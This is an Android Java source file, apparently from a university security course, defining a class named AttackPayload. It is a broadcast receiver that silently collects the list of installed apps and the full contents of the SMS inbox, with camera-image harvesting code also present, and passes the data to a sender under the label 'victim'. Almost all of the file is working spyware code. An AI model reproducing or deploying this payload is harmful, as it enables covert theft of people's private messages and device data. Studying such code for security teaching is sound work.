package edu.tufts.cs.security;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.MediaStore;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class AttackPayload extends BroadcastReceiver {
    // Get list of all the camera images
    // See http://stackoverflow.com/questions/4484158/list-all-camera-images-in-android
    public static final String CAMERA_IMAGE_BUCKET_NAME =
            Environment.getExternalStorageDirectory().toString()
                    + "/DCIM/Camera";
    public static final String CAMERA_IMAGE_BUCKET_ID =
            getBucketId(CAMERA_IMAGE_BUCKET_NAME);
    public static String getBucketId(String path) {
        return String.valueOf(path.toLowerCase().hashCode());
    }

    public static ArrayList<String> getCameraImages (Context context) {
        final String[] projection = { MediaStore.Images.Media.DATA };
        final String selection = MediaStore.Images.Media.BUCKET_ID + " = ?";
        final String[] selectionArgs = { CAMERA_IMAGE_BUCKET_ID };
        final Cursor cursor = context.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                null);
        ArrayList<String> result = new ArrayList<String>(cursor.getCount());
        if (cursor.moveToFirst()) {
            final int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            do {
                final String data = cursor.getString(dataColumn);
                result.add(data);
            }
            while (cursor.moveToNext());
        }
        cursor.close();
        return result;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        // List all apps installed
        // Source: http://stackoverflow.com/questions/2695746/how-to-get-a-list-of-installed-android-applications-and-pick-one-to-run
        final PackageManager pm = context.getPackageManager();

        // Get a list of installed apps.
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        JSONArray apps = new JSONArray();
        for (ApplicationInfo packageInfo : packages) {
            JSONObject app = new JSONObject();
            try {
                app.put("app_name", packageInfo.packageName);
            }
            catch (JSONException je) {}
            catch (Exception e) {}
            apps.put(app);
        }

        // Read SMS messages
        // See http://stackoverflow.com/questions/848728/how-can-i-read-sms-messages-from-the-inbox-programmatically-in-android
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        cursor.moveToFirst();

        JSONArray messages = new JSONArray();
        do {
            JSONObject sms = new JSONObject();
            for (int i = 0; i < cursor.getColumnCount(); i++) {
                try {
                    sms.put(cursor.getColumnName(i),cursor.getString(i));
                }
                catch (JSONException je) {}
                catch (Exception e) {}
            }
            messages.put(sms);
        }
        while(cursor.moveToNext());

        // List all the camera images
        /*ArrayList<String>images = getCameraImages(context);
        Iterator<String> it = images.iterator();
        while (it.hasNext()) {
            Log.d("*****", "Image found: " + it.next());
        }*/
        new SendMessage().execute("victim", apps.toString() + ";" + messages.toString());
    }
}
